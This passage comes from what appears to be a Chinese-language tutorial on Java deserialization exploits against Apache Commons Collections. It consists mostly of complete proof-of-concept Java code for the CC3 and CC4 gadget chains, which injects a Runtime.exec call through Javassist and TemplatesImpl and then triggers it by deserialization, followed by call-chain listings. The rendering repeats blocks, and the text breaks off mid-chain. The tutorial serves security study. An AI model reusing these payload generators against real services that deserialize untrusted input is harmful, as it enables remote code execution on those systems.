<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre class=" language-hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CC3</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br><br>        <span class="hljs-comment">//使用Javassit新建一个含有static的类</span><br>        ClassPool pool = ClassPool.getDefault();<br>        pool.insertClassPath(<span class="hljs-keyword">new</span> ClassClassPath(AbstractTranslet.class));<br>        CtClass cc = pool.makeClass(<span class="hljs-string">&quot;CC3&quot;</span>);<br>        String cmd = <span class="hljs-string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc.exe\&quot;);&quot;</span>;<br>        cc.makeClassInitializer().insertBefore(cmd);<br>        String randomClassName = <span class="hljs-string">&quot;CC3&quot;</span> + System.nanoTime();<br>        cc.setName(randomClassName);<br>        cc.setSuperclass(pool.get(AbstractTranslet.class.getName()));<br>        cc.writeFile();<br>        <span class="hljs-keyword">byte</span>[] classBytes = cc.toBytecode();<br>        <span class="hljs-keyword">byte</span>[][] targetByteCodes = <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[][]&#123;classBytes&#125;;<br><br>        <span class="hljs-comment">//补充实例化新建类所需的条件</span><br>        TemplatesImpl templates = TemplatesImpl.class.newInstance();<br>        setFieldValue(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, targetByteCodes);<br>        setFieldValue(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;blckder02&quot;</span>);<br>        setFieldValue(templates, <span class="hljs-string">&quot;_class&quot;</span>, <span class="hljs-keyword">null</span>);<br><br>        <span class="hljs-comment">//实例化新建类</span><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> Transformer[] &#123;<br>                <span class="hljs-keyword">new</span> ConstantTransformer(TrAXFilter.class),<br>                <span class="hljs-keyword">new</span> InstantiateTransformer(<span class="hljs-keyword">new</span> Class[]&#123;Templates.class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;templates&#125;)<br>        &#125;;<br>        ChainedTransformer transformerChain = <span class="hljs-keyword">new</span> ChainedTransformer(transformers);<br><br>        <span class="hljs-comment">//调用get()中的transform方法</span><br>        HashMap innermap = <span class="hljs-keyword">new</span> HashMap();<br>        LazyMap outerMap = (LazyMap)LazyMap.decorate(innermap, transformerChain);<br><br>        <span class="hljs-comment">//设置代理，触发invoke()调用get()方法</span><br>        Class cls1 = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        Constructor construct = cls1.getDeclaredConstructor(Class.class, Map.class);<br>        construct.setAccessible(<span class="hljs-keyword">true</span>);<br>        InvocationHandler handler1 = (InvocationHandler) construct.newInstance(Retention.class, outerMap);<br><br>        Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), <span class="hljs-keyword">new</span> Class[] &#123;Map.class&#125;, handler1);<br><br>        InvocationHandler handler2 = (InvocationHandler)construct.newInstance(Retention.class, proxyMap);<br><br>        <span class="hljs-keyword">try</span>&#123;<br>            ObjectOutputStream outputStream = <span class="hljs-keyword">new</span> ObjectOutputStream(<span class="hljs-keyword">new</span> FileOutputStream(<span class="hljs-string">&quot;serialize.ser&quot;</span>));<br>            outputStream.writeObject(handler2);<br>            outputStream.close();<br><br>            ObjectInputStream inputStream = <span class="hljs-keyword">new</span> ObjectInputStream(<span class="hljs-keyword">new</span> FileInputStream(<span class="hljs-string">&quot;serialize.ser&quot;</span>));<br>            inputStream.readObject();<br>        &#125;<span class="hljs-keyword">catch</span>(Exception e)&#123;<br>            e.printStackTrace();<br>        &#125;<br><br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setFieldValue</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Object obj, <span class="hljs-keyword">final</span> String fieldName, <span class="hljs-keyword">final</span> Object value)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>        <span class="hljs-keyword">final</span> Field field = getField(obj.getClass(), fieldName);<br>        field.set(obj, value);<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Field <span class="hljs-title">getField</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Class&lt;?&gt; clazz, <span class="hljs-keyword">final</span> String fieldName)</span> </span>&#123;<br>        Field field = <span class="hljs-keyword">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            field = clazz.getDeclaredField(fieldName);<br>            field.setAccessible(<span class="hljs-keyword">true</span>);<br>        &#125;<br>        <span class="hljs-keyword">catch</span> (NoSuchFieldException ex) &#123;<br>            <span class="hljs-keyword">if</span> (clazz.getSuperclass() != <span class="hljs-keyword">null</span>)<br>                field = getField(clazz.getSuperclass(), fieldName);<br>        &#125;<br>        <span class="hljs-keyword"><code class="language-hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CC3</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br><br>        <span class="hljs-comment">//使用Javassit新建一个含有static的类</span><br>        ClassPool pool = ClassPool.getDefault();<br>        pool.insertClassPath(<span class="hljs-keyword">new</span> ClassClassPath(AbstractTranslet.class));<br>        CtClass cc = pool.makeClass(<span class="hljs-string">&quot;CC3&quot;</span>);<br>        String cmd = <span class="hljs-string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc.exe\&quot;);&quot;</span>;<br>        cc.makeClassInitializer().insertBefore(cmd);<br>        String randomClassName = <span class="hljs-string">&quot;CC3&quot;</span> + System.nanoTime();<br>        cc.setName(randomClassName);<br>        cc.setSuperclass(pool.get(AbstractTranslet.class.getName()));<br>        cc.writeFile();<br>        <span class="hljs-keyword">byte</span>[] classBytes = cc.toBytecode();<br>        <span class="hljs-keyword">byte</span>[][] targetByteCodes = <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[][]&#123;classBytes&#125;;<br><br>        <span class="hljs-comment">//补充实例化新建类所需的条件</span><br>        TemplatesImpl templates = TemplatesImpl.class.newInstance();<br>        setFieldValue(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, targetByteCodes);<br>        setFieldValue(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;blckder02&quot;</span>);<br>        setFieldValue(templates, <span class="hljs-string">&quot;_class&quot;</span>, <span class="hljs-keyword">null</span>);<br><br>        <span class="hljs-comment">//实例化新建类</span><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> Transformer[] &#123;<br>                <span class="hljs-keyword">new</span> ConstantTransformer(TrAXFilter.class),<br>                <span class="hljs-keyword">new</span> InstantiateTransformer(<span class="hljs-keyword">new</span> Class[]&#123;Templates.class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;templates&#125;)<br>        &#125;;<br>        ChainedTransformer transformerChain = <span class="hljs-keyword">new</span> ChainedTransformer(transformers);<br><br>        <span class="hljs-comment">//调用get()中的transform方法</span><br>        HashMap innermap = <span class="hljs-keyword">new</span> HashMap();<br>        LazyMap outerMap = (LazyMap)LazyMap.decorate(innermap, transformerChain);<br><br>        <span class="hljs-comment">//设置代理，触发invoke()调用get()方法</span><br>        Class cls1 = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        Constructor construct = cls1.getDeclaredConstructor(Class.class, Map.class);<br>        construct.setAccessible(<span class="hljs-keyword">true</span>);<br>        InvocationHandler handler1 = (InvocationHandler) construct.newInstance(Retention.class, outerMap);<br><br>        Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), <span class="hljs-keyword">new</span> Class[] &#123;Map.class&#125;, handler1);<br><br>        InvocationHandler handler2 = (InvocationHandler)construct.newInstance(Retention.class, proxyMap);<br><br>        <span class="hljs-keyword">try</span>&#123;<br>            ObjectOutputStream outputStream = <span class="hljs-keyword">new</span> ObjectOutputStream(<span class="hljs-keyword">new</span> FileOutputStream(<span class="hljs-string">&quot;serialize.ser&quot;</span>));<br>            outputStream.writeObject(handler2);<br>            outputStream.close();<br><br>            ObjectInputStream inputStream = <span class="hljs-keyword">new</span> ObjectInputStream(<span class="hljs-keyword">new</span> FileInputStream(<span class="hljs-string">&quot;serialize.ser&quot;</span>));<br>            inputStream.readObject();<br>        &#125;<span class="hljs-keyword">catch</span>(Exception e)&#123;<br>            e.printStackTrace();<br>        &#125;<br><br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setFieldValue</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Object obj, <span class="hljs-keyword">final</span> String fieldName, <span class="hljs-keyword">final</span> Object value)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>        <span class="hljs-keyword">final</span> Field field = getField(obj.getClass(), fieldName);<br>        field.set(obj, value);<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Field <span class="hljs-title">getField</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Class&lt;?&gt; clazz, <span class="hljs-keyword">final</span> String fieldName)</span> </span>&#123;<br>        Field field = <span class="hljs-keyword">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            field = clazz.getDeclaredField(fieldName);<br>            field.setAccessible(<span class="hljs-keyword">true</span>);<br>        &#125;<br>        <span class="hljs-keyword">catch</span> (NoSuchFieldException ex) &#123;<br>            <span class="hljs-keyword">if</span> (clazz.getSuperclass() != <span class="hljs-keyword">null</span>)<br>                field = getField(clazz.getSuperclass(), fieldName);<br>        &#125;<br>        <span class="hljs-keyword">return</span> field;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>

<p>利用链：</p>
<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre class=" language-hljs reasonml"><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ObjectInputStream</span>.</span></span>read<span class="hljs-constructor">Object()</span><br>        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">AnnotationInvocationHandler</span>.</span></span>read<span class="hljs-constructor">Object()</span><br>            <span class="hljs-constructor">Map(Proxy)</span>.entry<span class="hljs-constructor">Set()</span><br>                <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">AnnotationInvocationHandler</span>.</span></span>invoke<span class="hljs-literal">()</span><br>                    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">LazyMap</span>.</span></span>get<span class="hljs-literal">()</span><br>                        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ChainedTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>                        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ConstantTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>                        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">InstantiateTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>                        <span class="hljs-keyword">new</span><span class="hljs-constructor">Instance()</span><br>                            TrAXFilter#<span class="hljs-constructor">TrAXFilter()</span><br>                            <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TemplatesImpl</span>.</span></span><span class="hljs-keyword">new</span><span class="hljs-constructor">Transformer()</span><br>                                     <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TemplatesImpl</span>.</span></span>get<span class="hljs-constructor">TransletInstance()</span><br>                                     <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TemplatesImpl</span>.</span></span>defineTransletClasses<br>                                     <span class="hljs-keyword">new</span><span class="hljs-constructor">Instance()</span><br>                                        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Runtime</span>.</span></span>exec<span class="hljs-literal"><code class="language-hljs reasonml"><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ObjectInputStream</span>.</span></span>read<span class="hljs-constructor">Object()</span><br>        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">AnnotationInvocationHandler</span>.</span></span>read<span class="hljs-constructor">Object()</span><br>            <span class="hljs-constructor">Map(Proxy)</span>.entry<span class="hljs-constructor">Set()</span><br>                <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">AnnotationInvocationHandler</span>.</span></span>invoke<span class="hljs-literal">()</span><br>                    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">LazyMap</span>.</span></span>get<span class="hljs-literal">()</span><br>                        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ChainedTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>                        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ConstantTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>                        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">InstantiateTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>                        <span class="hljs-keyword">new</span><span class="hljs-constructor">Instance()</span><br>                            TrAXFilter#<span class="hljs-constructor">TrAXFilter()</span><br>                            <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TemplatesImpl</span>.</span></span><span class="hljs-keyword">new</span><span class="hljs-constructor">Transformer()</span><br>                                     <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TemplatesImpl</span>.</span></span>get<span class="hljs-constructor">TransletInstance()</span><br>                                     <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TemplatesImpl</span>.</span></span>defineTransletClasses<br>                                     <span class="hljs-keyword">new</span><span class="hljs-constructor">Instance()</span><br>                                        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Runtime</span>.</span></span>exec<span class="hljs-literal">()</span><br></code></pre></td></tr></table></figure>





<h2 id="0x3-4-Commons-Collections4"><a href="#0x3-4-Commons-Collections4" class="headerlink" title="0x3.4 Commons Collections4"></a>0x3.4 Commons Collections4</h2><p>限制：</p>
<ul>
<li>JDK 1.7</li>
<li>commons-collections 4.0</li>
<li>javassist</li>
</ul>
<p>CC4 同CC3，使用TrAXFilter 来执行代码，只不过触发方式换成了 PriorityQueue +  TransformingComparator</p>
<p>POC:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre class=" language-hljs java"><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CC4</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br><br>        ClassPool pool = ClassPool.getDefault();<br>        pool.insertClassPath(<span class="hljs-keyword">new</span> ClassClassPath(AbstractTranslet.class));<br>        CtClass cc = pool.makeClass(<span class="hljs-string">&quot;CC4&quot;</span>);<br>        String cmd = <span class="hljs-string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc.exe\&quot;);&quot;</span>;<br>        cc.makeClassInitializer().insertBefore(cmd);<br>        String randomClassName = <span class="hljs-string">&quot;CC4&quot;</span> + System.nanoTime();<br>        cc.setName(randomClassName);<br>        cc.setSuperclass(pool.get(AbstractTranslet.class.getName()));<br>        cc.writeFile();<br>        <span class="hljs-keyword">byte</span>[] classBytes = cc.toBytecode();<br>        <span class="hljs-keyword">byte</span>[][] targetByteCodes = <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[][]&#123;classBytes&#125;;<br><br>        TemplatesImpl templates = TemplatesImpl.class.newInstance();<br>        setFieldValue(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, targetByteCodes);<br>        setFieldValue(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;name&quot;</span>);<br>        setFieldValue(templates, <span class="hljs-string">&quot;_class&quot;</span>, <span class="hljs-keyword">null</span>);<br><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> Transformer[] &#123;<br>                <span class="hljs-keyword">new</span> ConstantTransformer(TrAXFilter.class),<br>                <span class="hljs-keyword">new</span> InstantiateTransformer(<span class="hljs-keyword">new</span> Class[]&#123;Templates.class&#125;,<span class="hljs-keyword">new</span> Object[]&#123;templates&#125;)<br>        &#125;;<br>        ChainedTransformer transformerChain = <span class="hljs-keyword">new</span> ChainedTransformer(transformers);<br><br>        TransformingComparator Tcomparator = <span class="hljs-keyword">new</span> TransformingComparator(transformerChain);<br>        PriorityQueue queue = <span class="hljs-keyword">new</span> PriorityQueue(<span class="hljs-number">1</span>);<br><br>        Object[] queue_array = <span class="hljs-keyword">new</span> Object[]&#123;templates,<span class="hljs-number">1</span>&#125;;<br>        Field queue_field = Class.forName(<span class="hljs-string">&quot;java.util.PriorityQueue&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;queue&quot;</span>);<br>        queue_field.setAccessible(<span class="hljs-keyword">true</span>);<br>        queue_field.set(queue,queue_array);<br><br>        Field size = Class.forName(<span class="hljs-string">&quot;java.util.PriorityQueue&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;size&quot;</span>);<br>        size.setAccessible(<span class="hljs-keyword">true</span>);<br>        size.set(queue,<span class="hljs-number">2</span>);<br><br><br>        Field comparator_field = Class.forName(<span class="hljs-string">&quot;java.util.PriorityQueue&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;comparator&quot;</span>);<br>        comparator_field.setAccessible(<span class="hljs-keyword">true</span>);<br>        comparator_field.set(queue,Tcomparator);<br><br>        <span class="hljs-keyword">try</span>&#123;<br>            ObjectOutputStream outputStream = <span class="hljs-keyword">new</span> ObjectOutputStream(<span class="hljs-keyword">new</span> FileOutputStream(<span class="hljs-string">&quot;serialize.ser&quot;</span>));<br>            outputStream.writeObject(queue);<br>            outputStream.close();<br><br>            ObjectInputStream inputStream = <span class="hljs-keyword">new</span> ObjectInputStream(<span class="hljs-keyword">new</span> FileInputStream(<span class="hljs-string">&quot;serialize.ser&quot;</span>));<br>            inputStream.readObject();<br>        &#125;<span class="hljs-keyword">catch</span>(Exception e)&#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setFieldValue</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Object obj, <span class="hljs-keyword">final</span> String fieldName, <span class="hljs-keyword">final</span> Object value)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>        <span class="hljs-keyword">final</span> Field field = getField(obj.getClass(), fieldName);<br>        field.set(obj, value);<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Field <span class="hljs-title">getField</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Class&lt;?&gt; clazz, <span class="hljs-keyword">final</span> String fieldName)</span> </span>&#123;<br>        Field field = <span class="hljs-keyword">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            field = clazz.getDeclaredField(fieldName);<br>            field.setAccessible(<span class="hljs-keyword">true</span>);<br>        &#125;<br>        <span class="hljs-keyword">catch</span> (NoSuchFieldException ex) &#123;<br>            <span class="hljs-keyword">if</span> (clazz.getSuperclass() != <span class="hljs-keyword">null</span>)<br>                field = getField(clazz.getSuperclass(), fieldName);<br>        &#125;<br>        <span class="hljs-keyword"><code class="language-hljs java"><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CC4</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br><br>        ClassPool pool = ClassPool.getDefault();<br>        pool.insertClassPath(<span class="hljs-keyword">new</span> ClassClassPath(AbstractTranslet.class));<br>        CtClass cc = pool.makeClass(<span class="hljs-string">&quot;CC4&quot;</span>);<br>        String cmd = <span class="hljs-string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc.exe\&quot;);&quot;</span>;<br>        cc.makeClassInitializer().insertBefore(cmd);<br>        String randomClassName = <span class="hljs-string">&quot;CC4&quot;</span> + System.nanoTime();<br>        cc.setName(randomClassName);<br>        cc.setSuperclass(pool.get(AbstractTranslet.class.getName()));<br>        cc.writeFile();<br>        <span class="hljs-keyword">byte</span>[] classBytes = cc.toBytecode();<br>        <span class="hljs-keyword">byte</span>[][] targetByteCodes = <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[][]&#123;classBytes&#125;;<br><br>        TemplatesImpl templates = TemplatesImpl.class.newInstance();<br>        setFieldValue(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, targetByteCodes);<br>        setFieldValue(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;name&quot;</span>);<br>        setFieldValue(templates, <span class="hljs-string">&quot;_class&quot;</span>, <span class="hljs-keyword">null</span>);<br><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> Transformer[] &#123;<br>                <span class="hljs-keyword">new</span> ConstantTransformer(TrAXFilter.class),<br>                <span class="hljs-keyword">new</span> InstantiateTransformer(<span class="hljs-keyword">new</span> Class[]&#123;Templates.class&#125;,<span class="hljs-keyword">new</span> Object[]&#123;templates&#125;)<br>        &#125;;<br>        ChainedTransformer transformerChain = <span class="hljs-keyword">new</span> ChainedTransformer(transformers);<br><br>        TransformingComparator Tcomparator = <span class="hljs-keyword">new</span> TransformingComparator(transformerChain);<br>        PriorityQueue queue = <span class="hljs-keyword">new</span> PriorityQueue(<span class="hljs-number">1</span>);<br><br>        Object[] queue_array = <span class="hljs-keyword">new</span> Object[]&#123;templates,<span class="hljs-number">1</span>&#125;;<br>        Field queue_field = Class.forName(<span class="hljs-string">&quot;java.util.PriorityQueue&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;queue&quot;</span>);<br>        queue_field.setAccessible(<span class="hljs-keyword">true</span>);<br>        queue_field.set(queue,queue_array);<br><br>        Field size = Class.forName(<span class="hljs-string">&quot;java.util.PriorityQueue&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;size&quot;</span>);<br>        size.setAccessible(<span class="hljs-keyword">true</span>);<br>        size.set(queue,<span class="hljs-number">2</span>);<br><br><br>        Field comparator_field = Class.forName(<span class="hljs-string">&quot;java.util.PriorityQueue&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;comparator&quot;</span>);<br>        comparator_field.setAccessible(<span class="hljs-keyword">true</span>);<br>        comparator_field.set(queue,Tcomparator);<br><br>        <span class="hljs-keyword">try</span>&#123;<br>            ObjectOutputStream outputStream = <span class="hljs-keyword">new</span> ObjectOutputStream(<span class="hljs-keyword">new</span> FileOutputStream(<span class="hljs-string">&quot;serialize.ser&quot;</span>));<br>            outputStream.writeObject(queue);<br>            outputStream.close();<br><br>            ObjectInputStream inputStream = <span class="hljs-keyword">new</span> ObjectInputStream(<span class="hljs-keyword">new</span> FileInputStream(<span class="hljs-string">&quot;serialize.ser&quot;</span>));<br>            inputStream.readObject();<br>        &#125;<span class="hljs-keyword">catch</span>(Exception e)&#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setFieldValue</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Object obj, <span class="hljs-keyword">final</span> String fieldName, <span class="hljs-keyword">final</span> Object value)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>        <span class="hljs-keyword">final</span> Field field = getField(obj.getClass(), fieldName);<br>        field.set(obj, value);<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Field <span class="hljs-title">getField</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Class&lt;?&gt; clazz, <span class="hljs-keyword">final</span> String fieldName)</span> </span>&#123;<br>        Field field = <span class="hljs-keyword">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            field = clazz.getDeclaredField(fieldName);<br>            field.setAccessible(<span class="hljs-keyword">true</span>);<br>        &#125;<br>        <span class="hljs-keyword">catch</span> (NoSuchFieldException ex) &#123;<br>            <span class="hljs-keyword">if</span> (clazz.getSuperclass() != <span class="hljs-keyword">null</span>)<br>                field = getField(clazz.getSuperclass(), fieldName);<br>        &#125;<br>        <span class="hljs-keyword">return</span> field;<br>    &#125;<br><br></code></pre></td></tr></table></figure>



<p>利用链：</p>
<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre class=" language-hljs reasonml"><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ObjectInputStream</span>.</span></span>read<span class="hljs-constructor">Object()</span><br>    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">PriorityQueue</span>.</span></span>read<span class="hljs-constructor">Object()</span><br>        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">PriorityQueue</span>.</span></span>heapify<span class="hljs-literal">()</span><br>            <span class="hljs-module-access"><span class="hljs-module"><span 